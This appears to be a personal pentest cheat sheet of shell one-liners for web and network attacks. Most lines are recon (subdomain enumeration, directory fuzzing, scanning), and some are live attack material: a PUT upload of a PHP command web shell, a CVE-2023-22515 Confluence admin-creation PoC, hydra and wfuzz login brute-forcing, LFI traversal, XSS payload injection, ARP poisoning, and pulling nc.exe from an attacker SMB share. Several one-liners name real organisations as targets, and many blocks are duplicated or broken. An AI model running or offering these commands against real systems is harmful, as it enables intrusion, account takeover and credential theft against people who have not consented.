
----
Nikto

nikto -h http://$IP

##-=========================-##
##    [+]  Nikto - Connect using squid proxy

nikto -h $IP -useproxy http://$IP:4444

##-=========================-##
##    [+]  Curl - Get header
##-==============================-##
curl -i $IP

##-=========================-##
##    [+]  Curl - Get everything
##-==============================-##
curl -i -L $IP

##-=========================-##
##    [+]  Curl - Check for title and all links
##-==============================-##
curl $IP -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

##-=========================-##
##    [+]  Curl - Look at page with just text
##-==============================-##
curl $IP -s -L | html2text -width '99' | uniq

##-=========================-##
##    [+]  Curl - Check if it is possible to upload
##-==============================-##
curl -v -X OPTIONS http://$IP
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$IP/test/shell.php


dotdotpwn.pl -m http -h $IP -M GET -o unix




##  
##-==============================-##
curl -s "https://crt.sh/?q=%25.$DM&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | grep -o "\w.*$DM" | anew -q .tmp/cert.list


##  
##-==============================-##
curl -s "https://api.hackertarget.com/hostsearch/?q=$DM" | grep -o "\w.*$DM" | anew -q .tmp/htarget.list


##  
##-==============================-##
curl -s "https://riddler.io/search/exportcsv?q=pld:$DM" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep -o "\w.*$DM" | anew -q .tmp/riddler.list



##   PoC for CVE-2023-22515: 
##-==============================-##
curl -k -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=adm1n&fullName=admin&email=admin@confluence&password=adm1n&confirm=adm1n&setup-next-button=Next" http://confluence/setup/setupadministrator.action 
##   (login with adm1n/adm1n)



##  
##-==============================-##
assetfinder --subs-only $DM | anew -q .tmp/assetfinder.list
    python3 ~/tools/Sublist3r/


###  
##     [+] ffuf - Search to files using assetfinder and ffuf

##-==============================-##
assetfinder att.com | sed 's#*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'



###  HTTPX using new mode location and injection XSS using 

##-==============================-##
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo '(http|https)://[^/"].*' | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" "'




assetfinder -subs-only http://tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"



## Recon subdomains and Screenshot to URL using gowitness

##-==============================-##
assetfinder -subs-only army.mil | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @' 




##   [+] SUBDOMAIN ENUMERATION


##   [+] 

curl -s "https://crt.sh/?q=%25.$DM&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u | grep -o "\w.*$DM" | anew -q .tmp/cert.list
 


##   [+] 

curl -s "https://api.hackertarget.com/hostsearch/?q=$DM" | grep -o "\w.*$DM" | anew -q .tmp/htarget.list



##   [+] 

curl -s "https://riddler.io/search/exportcsv?q=pld:$DM" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep -o "\w.*$DM" | anew -q .tmp/riddler.list



##   [+] 

assetfinder --subs-only $DM | anew -q .tmp/assetfinder.list
    python3 ~/tools/Sublist3r/



##   [+] 

sublist3r.py -d $DM -o .tmp/sublister.list &> /dev/null



##   [+] 

 subfinder -silent -d $DM -all -t 100 -o .tmp/subfinder.list &> /dev/null



##   [+] 

amass enum -passive -d $DM -o .tmp/amass.list &> /dev/null



##   [+] 

crobat -s $DM | anew -q .tmp/crobat.list





##  
sublist3r.py -d $DM -o .tmp/sublister.list &> /dev/null
   
 
 ##  
 subfinder -silent -d $DM -all -t 100 -o .tmp/subfinder.list &> /dev/null
 
 
##  
amass enum -passive -d $DM -o .tmp/amass.list &> /dev/null


Amass intel will search the organization "PayPal" 
from a database of ASNs at a faster-than-default rate.
 It will then take these ASN numbers and scan the complete ASN/IP space for all TLD's in that IP space (paypal.com, paypal.co.id, paypal.me).


amass intel -org paypal -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500''





##  
crobat -s $DM | anew -q .tmp/crobat.list



##-=================================-##
##    [+]  Ettercap - ARP Cache Poisoning 
##-=================================-##
ettercap -T -q -i <interface> -w dump -M ARP /<ip_target>/ /<ip_gateway>/



##  Note: Do not forget to enable routing, 
##  otherwise it will cut internet connection for targets.


##-========================-##
##     [+]  Bettercap - Web UI
##-========================-##
bettercap -caplet https-ui -iface <interface>


##-=========================-##
##     [+]  Bettercap - LAN Recon
##-=========================-##
net.recon on 		# Periodically read ARP table in order to detect new hosts on LAN
net.probe on 		# Send different types of probes to each IP in current subnet




##-=========================-##
##    [+]  DSniff - 
##-=========================-## 
dsniff -p <pcapfile>
dsniff -i <interface>


##-===============================-##
##    [+]  URLSnarf - MITM URL sniffing:
##-===============================-##
urlsnarf -p <pcapfile>
urlsnarf -i <interface>




##-===================-##
##     [+] Check Headers
##-===================-##
python3 finalrecon.py --headers $URL


##-========================-##
##     [+] Check SSL Certificate
##-========================-##
python3 finalrecon.py --sslinfo $URL


##-=====================-##
##     [+] Check Whois Info
##-=====================-##
python3 finalrecon.py --whois $URL


##-===================-##
##     [+] Crawl Target
##-===================-##
python3 finalrecon.py --crawl $URL

##-========================-##
##     [+] Directory Searching
##-========================-##
python3 finalrecon.py --dir $URL -e txt,php -w /$Dir/$File


##-==================-##
##     [+] Full Scan
##-==================-##
python3 finalrecon.py --full $URL


##-=================================-##
##     [+] Dirb - No recursive + output file:
##-=================================-##
dirb http://$IP -r -o dirb-IPAddr.txt


##-==================================-##
##     [+] Dirb - Test with specified wordlist
##-==================================-##
dirb http://$IP /usr/share/wordlists/dirb/common.txt


##-==================================-##
##     [+] Dirb -Test for specific extensions
##-==================================-##
dirb http://$IP -X .php,.txt


##-==================================-##
##     [+] Dirb - Connection Through proxy
##-==================================-##
dirb http://$IP -p $PROXYIP:$PROXYPORT -P $User:$Pass


##-===============================-##
##     [+] Web Scanning with extensions
##-===============================-##



##-==============================-##
##     [+] Gobuster - Linux 
##-===============================-##
## -------------------------------------------------------------- ##
##    [?]  Example web server: Apache
## -------------------------------------------------------------- ##
gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,jsp,pl -s 200,204,301,302,307,403,401


##-==========================-##
##     [+] Gobuster - Windows 
##-==========================-##
## ---------------------------------------------------- ##
##    [?]  Example web server: IIS
## ---------------------------------------------------- ##
gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,asp,aspx,jsp,bak -s 200,204,301,302,307,403,401


##-===============================-##
##     [+] DirSearch - Linux 
##-===============================-##
## -------------------------------------------------------------- ##
##    [?]  Example web server: Apache)
## -------------------------------------------------------------- ##
python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,jsp,pl -t 50


##-===============================-##
##     [+] DirSearch - Windows
##-===============================-##
## -------------------------------------------------------------- ##
##    [?]  Example web server: IIS)
## -------------------------------------------------------------- ##
python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,asp,aspx,jsp,bak -t 50



##-===============================-##
##     [+] DirSearch - banner inspection
##-===============================-##
dirsearch big.txt -e sh,txt,htm,php,cgi,html,pl,bak,old




##-========================-##
##     [+] HTTP
##-========================-##
gobuster dir -u http://10.10.10.10 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -t 69



##-========================-##
##     [+]  HTTPS
##-========================-##
gobuster dir -k -u https://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 69 



##-========================-##
##     [+] 
##-========================-##
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.27 -x '.php' -e -t 25



##-========================-##
##     [+] 
##-========================-##
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.27 -e -t 25




##   Paramspider - 

##-========================-##
##     [+] Paramspider - 
##-========================-##
##  Discover URLs for a single domain:
paramspider -d example.com



##-========================-##
##     [+] Paramspider - 
##-========================-##
##  Discover URLs for multiple
domains from a file:
##-==============================-##
paramspider -l domains.txt


##-========================-##
##     [+] Paramspider - 
##-========================-##
##  Stream URLs on the termial:
##-==============================-##
paramspider -d example.com -s


##-========================-##
##     [+] Paramspider - 
##-========================-##
##  Set up web request proxy:
##-==============================-##
paramspider -d example.com --proxy '127.0.0.1:7890'



##-========================-##
##     [+] Paramspider - 
##-========================-##
##  Adding a placeholder for URL 
##  parameter values (default: "FUZZ"):
##-==============================-##
paramspider -d example.com -p '"><h1>reflection</h1>'






##-========================-##
##     [+] 
##-========================-##
##  Nikto 
##-==============================-##
nikto -h 10.10.10.10 -p 80

##-========================-##
##     [+] 
##-========================-##
##  Nikto HTTPS 
##-==============================-##
nikto -h 10.10.10.10 -p 443



##-========================-##
##     [+] 
##-========================-##
##  wfuzz POST 
##-==============================-##
wfuzz --hc 404 -c -z list,admin -z file,/root/Documents/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZ2Z" http://192.168.30.161/admin/index.php 


##-========================-##
##     [+] 
##-========================-##
##  hydra POST 
##-==============================-##
hydra 192.168.30.161 -s 80 http-form-post "/admin/index.php:user=^USER^&password=^PASS^:Moved Temporarily" -l admin -P /root/Documents/SecLists/Passwords/korelogic-password.txt -t 20 


##-========================-##
##     [+]  wfuzz - NTLM 
##-==============================-##
wfuzz -c --ntlm "admin:FUZZ" -z file,/root/Documents/SecLists/Passwords/darkc0de.txt --hc 401 https://<ip>/api 


##-================================-##
##     [+]  wfuzz Basic Auth through Proxy 
##-==============================-##
##-========================-##
wfuzz -c --hc 404,400,401 -z file,/root/Documents/Audits/ActivosProduban/names.txt -z file,/root/Documents/Audits/ActivosProduban/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://<ip>/api/v1/





##  
##-========================-##
##     [+] 
##-========================-##
wfuzz -u http://10.10.10.10/hello.php?dir=../../../../../../../../../FUZZ%00 -w /usr/share/wfuzz/wordlist/general/common.txt


##-========================-##
##     [+] 
##-========================-##
##   [+]  WFuzz - 
##-========================-##
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'


##-========================-##
##     [+] 
##-========================-##
##   [+]  WFuzz - Write to File
##-========================-##
wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404


##-========================-##
##     [+] 
##-========================-##
##   [+]  WFuzz - Custom Scan with limited Output
##-========================-##
wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20


##-========================-##
##     [+] 
##-========================-##
##   [+]  WFuzz - Fuzzing two Parameters at once
##-==============================-##
##-========================-##
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c


##-========================-##
##     [+] 
##-========================-##
##   [+]  WFuzz - Domain
##-========================-##
wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/



##-========================-##
##   [+]  WFuzz - Subdomain
##-========================-##
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>


##-========================-##
##     [+] 
##-========================-##
##      [+]  WFuzz - Git
##-========================-##
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404



##-========================-##
##     [+]  WFuzz - Login
##-========================-##
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --hc 200 -c
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --ss "Invalid login"



##-========================-##
##      [+]  WFuzz - SQL
##-========================-##
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http


##-========================-##
##     [+] 
##-========================-##
##   [+]  WFuzz - DNS
##-========================-##
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100


##-========================-##
##     [+] 
##-========================-##
##-==============================-##
##   [+]  WFuzz - Numbering Files
##-==============================-##
wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip


##-========================-##
##     [+] 
##-========================-##
##-==============================-##
##   [+]  WFuzz - Enumerating PIDs
##-==============================-##
wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000




##-========================-##
##     [+] 
##-========================-##
##-==============================-##
##   [+] Fuzz files and directories

##-==============================-##

##   [+] files

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 200 -f recon/wfuzz-files.out "$URL/FUZZ" 
feroxbuster --url $URL -e -x .php,txt,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o recon/ferox.out


##-========================-##
##     [+] 
##-========================-##
##   [+] directories

##-==============================-##

wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -t 200 -f recon/wfuzz-dirs.out "$URL/FUZZ/"
ffuf -c -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 200 -o recon/ffuf.md
dirb $URL /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -o recon/dirb.out 
dirbuster -r recon/dirbuster.out #GUI
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -o recon/gobuster.out


##-========================-##
##     [+] 
##-========================-##
##   [+] 

##-==============================-##
##     [+] ffuf -change request method
##-========================-##
ffuf -c -t 200 -fs 50,182 -u "$URL/FUZZ/" -w /usr/share/wordlists/dirb/big.txt -o recon/ffuf-post_method.md -t 200 -X POST


##-========================-##
##     [+] 
##-========================-##
##   [+] 
##-==============================-##
##     [+] ffuf -FUZZ file extensions
##-==============================-##
##-========================-##
ffuf -u $URL/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt -o recon/ffuf-ext.md -t 200
ffuf -c -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .sh,.cgi,.pl,.py -fc 404 -t 200 -o recon/ffuf-extensions.md

##-========================-##
##     [+] 
##-========================-##

##-==============================-####     [+] ffuf -FUZZ parameters

##-==============================-##
don't forget to include LFI or RFI statements

ffuf -u "$URL/?FUZZ=1" -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fw 39 -t 200
for i in {0..255}; do echo $i; done | ffuf -u '$URL?id=FUZZ' -c -w - -fw 33 -t 200 -o recon/sequence.md


##-==============================-##
##     [+] ffuf -

##-==============================-##
ffuf -u http://FUZZ.$DM/ -t 100 -p '1.0-2.0' -w ~/wordlists/subdomains.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" -mc 200 -r -o .tmp/ffuf.json -s 2> /dev/null &> /dev/null



gobuster dns -d $DM --no-error -z -q -t 100 -w ~/wordlists/subdomains.txt 2> /dev/null | sed 's/Found: //g' | anew -q .tmp/gobuster.list
 
 

amass enum -active -brute -w ~/wordlists/subdomains.txt -d $DM -o .tmp/amassact.list &> /dev/null
cat .tmp/ffuf.json 2> /dev/null | jq -r '.results[] | .host' 2> /dev/null | anew -q .tmp/ffuf.list && rm -rf .tmp/ffuf.json


cat .tmp/*.list | grep -v "*" | sed '/@\|<BR>\|\_\|*/d' | grep "$DM" | anew -q .tmp/domains
    

xargs -a .tmp/domains -P 50 -I % bash -c "assetfinder --subs-only % | anew -q .tmp/seconddomains.list" 2> /dev/null


xargs -a .tmp/domains -P 10 -I % bash -c "amass enum -passive -d %" 2> /dev/null | anew -q .tmp/seconddomains.list





    
if [ -f "$EC" ]; then

       cat .tmp/*.list | grep -v "*" | grep -vf $EC | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt
else
        cat .tmp/*.list | grep -v "*" | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt
fi




##-===================================-##
##    [+]   WEB PROBING AND SCREENSHOT
##-===================================-##
naabu -retries 3 -r ~/wordlists/resolvers.txt -l database/subdomains.txt -p "$PR" -silent -no-color 2> /dev/null | anew -q database/ports.txt

cat database/ports.txt | httprobe -prefer-https | anew -q database/lives.txt





xargs -a database/lives.txt -P 50 -I % bash -c "echo % | aquatone -chrome-path $CHROME_BIN -out database/screenshots/ -threads 10 -silent" 2> /dev/null &> /dev/null








##-========================-##
##     [+] 
##-========================-##
##   [+] bruteforce login

wfuzz -c -z file,users.txt -z file,pass.txt -d "name=FUZZ&password=FUZ2Z" --sc 200 --hh 206 -t 200 $URL/login.php

##-==============================-##
# check type: GET or POST request 
##-==============================-##
hydra -I -V -F -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login.php:username=admin&password=^PASS^:Invalid Password:H=Cookie: PHPSESSID=cd892e2HNW3N" -t 64


##-========================-##
##     [+] 
##-========================-##
##-==============================-##
##   [+] subdomain bruteforce

##-==============================-##
wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hl 7 -t 200 -u "$URL" -H "Host: FUZZ.$domain"
gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200


##-==============================-##
##   [+] vulnerability scanners
##-==============================-##

##-========================-##
##     [+] 
##-========================-##
nikto --host $URL -C all -o recon/nikto.txt 
whatweb -a 4 $URL



##-========================-##
##     [+] 
##-========================-##
wfuzz -z range,1-65600 --hc 500  "http://IP:PORT/dir?parameter=id&port=FUZZ"

##  Fuzz a range of ids/port numbers



##-========================-##
##     [+] ffuf -
##-========================-##
ffuf -u http://FUZZ.$DM/ -t 100 -p '1.0-2.0' -w ~/wordlists/subdomains.txt -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36" -mc 200 -r -o .tmp/ffuf.json -s 2> /dev/null &> /dev/null


##-========================-##
##     [+] ffuf - Wfuzz style of URL param fuzzing:
##-========================-##
ffuf -w /usr/share/commix/src/txt/passwords_john.txt    -u 'http://eve.example.com/url/path?username=alice&password=FUZZ'  --fw 3  -c



##-========================-##
##     [+] ffuf - Dirbuster/gobuster style URL path fuzzing:
##-========================-##
ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt  -u http://eve.example.com/url/path/FUZZ  -e php



##-========================-##
##     [+] 
##-========================-##
gobuster dns -d $DM --no-error -z -q -t 100 -w ~/wordlists/subdomains.txt 2> /dev/null | sed 's/Found: //g' | anew -q .tmp/gobuster.list
 
 
##-========================-##
##     [+] 
##-========================-##
amass enum -active -brute -w ~/wordlists/subdomains.txt -d $DM -o .tmp/amassact.list &> /dev/null
cat .tmp/ffuf.json 2> /dev/null | jq -r '.results[] | .host' 2> /dev/null | anew -q .tmp/ffuf.list && rm -rf .tmp/ffuf.json



##-========================-##
##     [+] 
##-========================-##
cat .tmp/*.list | grep -v "*" | sed '/@\|<BR>\|\_\|*/d' | grep "$DM" | anew -q .tmp/domains



##-========================-##
##     [+] 
##-========================-##
xargs -a .tmp/domains -P 50 -I % bash -c "assetfinder --subs-only % | anew -q .tmp/seconddomains.list" 2> /dev/null



##-========================-##
##     [+] 
##-========================-##
xargs -a .tmp/domains -P 10 -I % bash -c "amass enum -passive -d %" 2> /dev/null | anew -q .tmp/seconddomains.list



if [ -f "$EC" ]; then
    cat .tmp/*.list | grep -v "*" | grep -vf $EC | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt

else
        cat .tmp/*.list | grep -v "*" | sort -u | sed '/@\|<BR>\|\_\|*/d' | dnsx -a -aaaa -cname -ns -ptr -mx -soa -retry 3 -r ~/wordlists/resolvers.txt -t 10 -silent | anew -q database/subdomains.txt

fi



##-=====================================-##
##     [+] naabu - Web Probing + Screenshots:
##-====================================-##
##   WEB PROBING AND SCREENSHOT
 naabu -retries 3 -r ~/wordlists/resolvers.txt -l database/subdomains.txt -p "$PR" -silent -no-color 2> /dev/null | anew -q database/ports.txt


##-========================-##
##     [+] 
##-========================-##
cat database/ports.txt | httprobe -prefer-https | anew -q database/lives.txt


##-========================-##
##     [+] 
##-========================-##
xargs -a database/lives.txt -P 50 -I % bash -c "echo % | aquatone -chrome-path $CHROME_BIN -out database/screenshots/ -threads 10 -silent" 2> /dev/null &> /dev/null


##-========================-##
##     [+] Gospider - 
##-========================-##
gospider -S database/lives.txt -d 10 -c 20 -t 50 -K 3 --no-redirect --js -a -w --blacklist ".(eot|jpg|jpeg|gif|css|tif|tiff|png|ttf|otf|woff|woff2|ico|svg|txt)" --include-subs -q -o .tmp/gospider 2> /dev/null | anew -q .tmp/gospider.list


##-================================-##
##     [+] Gospider - Search Subdomain
##-================================-##
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew


##-========================-##
##     [+] 
##-========================-##
xargs -a database/lives.txt -P 50 -I % bash -c "echo % | waybackurls" 2> /dev/null | anew -q .tmp/waybackurls.list


##-========================-##
##     [+] 
##-========================-##
xargs -a database/lives.txt -P 50 -I % bash -c "echo % | gau --blacklist eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg,txt --retries 3 --threads 50" 2> /dev/null | anew -q .tmp/gau.list 2> /dev/null &> /dev/null


##-==========================================-##
##     [+] Filtering duplicate and common endpoints
##-==========================================-##
cat .tmp/gospider.list .tmp/gau.list .tmp/waybackurls.list 2> /dev/null | sed '/\[/d' | grep $DM | sort -u | uro | anew -q database/urls.txt 

 
 
 
 
##-=============================-##
##    [+] Gather all urls, send to burp:
##-=============================-##
cat hosts | sed 's/https\?:\/\///' | gau > urls.txt

cat urls.txt | grep -P "\w+\.js(\?|$)" | sort -u > jsurls.txt

ffuf -mc 200 -w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http:127.0.0.1:8080
 
 
 
 
 
 
 
 
 
 
 
 



##-====================================-##
##      [+] bbot - Full subdomain  enumeration
##-====================================-##
bbot -t $Domain -f subdomain-enum



##-=========≈=≈=======================-##
##      [+] bbot - Subdomains (passive only):
##-================/===================-##
bbot -t $Domain -f subdomain-enum -rf passive


## ------------------------------------------------------------------ ##
##      [?]  Port-scan every subdomain
##      [?]  screenshot every webpage
##      [?]  output to current directory
## ------------------------------------------------------------------ ##
bbot -t $Domain -f subdomain-enum -m nmap gowitness -n my_scan -o .


##-=========≈=≈=======================-##
##    [+] bbot - Subdomains + basic web scan:
##-=========≈=≈=======================-##
## ------------------------------------------------------------------ ##
##      [?]  includes wappalyzer, robots.txt,
##      [?]  and other non-intrusive web modules
## ------------------------------------------------------------------ ##
bbot -t $Domain -f subdomain-enum web-basic


##-=========================-##
##      [+]  bbot - Web spider:
##-=========================-##
## ------------------------------------------------------------------ ##
##   [?] Crawl $Domain
##   [?] max depth of 2 
##   [?] auto extract emails, secrets, etc.
## ------------------------------------------------------------------ ##
bbot -t $Domain -m httpx robots badsecrets secretsdb -c web_spider_distance=2 web_spider_depth=2


##-========================================-##
##     [+]  bbot - Everything everywhere all at once:
##-========================================-##
## ------------------------------------------------------------------ ##
##     [?]  Subdomains, emails, web scan,
##     [?]  cloud buckets, port scan, 
##     [?]  web screenshots, nuclei
## ------------------------------------------------------------------ ##
bbot -t  $Domain -f subdomain-enum email-enum cloud-enum web-basic -m nmap gowitness nuclei --allow-deadly


##  
metagoofil -d $Domain -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 20 -n 20  -o ~/Desktop/$Domain/metagoofil/ -f ~/Desktop/$Domain/users_temp.txt 


##  
metagoofil -d $Domain -t doc,pdf -l 100 -n 3 -o $MetagoofilFiles
 
 
##  
exiftool -r *.doc | egrep -i "Author|Creator|Email|Producer|Template" | sort -u
 
 
##  
metagoofil -d $Domain -t doc,pdf -l 100 -n 3 -o $MetagoofilFiles




##-====================================-##
##   [+]  WPScan - 
##-====================================-##
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50


##-====================================-##
##   [+]  WPScan - 
##-====================================-##
wpscan --username bully --url http://172.31.2.117/bull/ --wordlist words-john.txt --threads 10


##-====================================-##
##   [+]  WPScan - 
##-====================================-##
wpscan --url 172.31.2.117/bull/ -r --enumerate u --enumerate p --enumerate t --enumerate tt


##-====================================-##
##   [+]  WPScan - 
##-====================================-##
wpscan –u http://192.168.1.103/backup_wordpress --username john --wordlist /usr/share/wordlists/rockyou.txt



##-====================================-##
##   [+]  Cors Misconfigration - One Liners
##-====================================-##
cors_reflect_auto(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;$url;else echo Nothing on "$url";fi;done
}
cors_null_origin(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: null" -X GET $url) | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done

}
cors_null_value(){
        gau $1 | while read url;do target=$(curl -s -I -X GET "$url") | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
}
cors_trust_subdomain(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: evil.$url" -X GET "$url") | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
}
cors_domain_not_valid(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: https://not$site" -X GET "$url") | if grep 'Access-Control-Allow-Origin: https://not$site'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
}
cors_dom_ext(){
        gau $1 | while read url;do target=$(curl -s -I -H "Origin: $site.evil.com" -X GET "$url") | if grep "Origin: Access-Control-Allow-Origin: $site.evil.com";  then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done
}





## SMB
impacket-smbserver share -smb2support /tmp/

copy \\192.168.1.13\share\nc.exe


## If you get an error, 
## use an account name and password:
impacket-smbserver share -smb2support /tmp/smbshare -user gajos -password gajos

net use g: \\192.168.1.13\share /user:test test



##  
onesixtyone -c wordlist-common-snmp-community-strings.txt 172.31.2.181
 
 
##  
snmpwalk -Os -c public -v 1 172.31.2.181



##  
masscan -p1-65535 $(dig +short $strip|grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"|head -1) --max-rate 1000 |& tee $strip_scan





##  
masscan -iL ips-online.txt --rate 10000 -p1-65535 --only-open -oL masscan.out
masscan -e tun0 -p1-65535,U:1-65535 10.10.10.97 --rate 1000


##  find machines on the network
masscan --rate 500 --interface tap0 --router-ip $ROUTER_IP --top-ports 100 $NETWORK -oL masscan_machines.tmp
cat masscan_machines.tmp | grep open | cut -d " " -f4 | sort -u > masscan_machines.lst


##  find open ports for one machine
masscan --rate 1000 --interface tap0 --router-ip $ROUTER_IP -p1-65535,U:1-65535 $MACHINE_IP --banners -oL $MACHINE_IP/scans/masscan-ports.lst


##  TCP grab banners and services information
TCP_PORTS=$(cat $MACHINE_IP/scans/masscan-ports.lst| grep open | grep tcp | cut -d " " -f3 | tr '\n' ',' | head -c -1)

